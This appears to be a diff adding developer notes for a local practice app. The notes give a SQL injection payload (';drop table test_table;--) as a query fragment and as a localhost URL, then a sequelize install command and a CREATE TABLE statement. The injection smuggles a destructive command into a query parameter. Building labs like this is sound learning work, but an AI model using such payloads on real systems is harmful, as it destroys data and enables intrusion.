@@ -1,0 +1,22 @@
+to sql inject and drop the table, test table:
+
+products?name=';drop table test_table;--
+
+or
+
+http://localhost:3000/products?name=%27;drop%20table%20test_table;--
+
+
+install sequelize
+
+npm install --save sequelize
+
+
+Create table:
+
+CREATE TABLE test_table (
+    article_id bigserial primary key,
+    article_name varchar(20) NOT NULL,
+    article_desc text NOT NULL,
+    date_added timestamp default NULL
+);
